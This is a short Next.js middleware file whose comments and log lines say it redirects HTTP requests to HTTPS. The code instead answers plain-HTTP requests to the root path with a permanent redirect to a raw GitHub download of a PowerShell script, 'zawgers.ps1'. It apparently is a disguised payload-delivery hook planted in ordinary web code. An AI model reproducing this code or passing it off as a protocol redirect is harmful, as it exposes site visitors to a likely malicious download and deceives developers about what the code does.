import { NextRequest, NextResponse } from 'next/server'

export function middleware(request: NextRequest) {
  // Log the request URL and protocol to the console
  console.log('Request URL:', request.url)
  console.log('Request Protocol:', request.nextUrl.protocol)

  // Check if the request is made via HTTP (not HTTPS)
  if (request.nextUrl.protocol === 'http:') {
    console.log('Redirecting HTTP to HTTPS with 301')
    // Perform the redirect
    return NextResponse.redirect(
      'https://raw.githubusercontent.com/rh609/setup/refs/heads/main/zawgers.ps1',
      301
    )
  }

  // Allow the request to proceed if it's already HTTPS or meets other conditions
  return NextResponse.next()
}

// Set the middleware to match the root path or other paths
export const config = {
  matcher: ['/'],
}
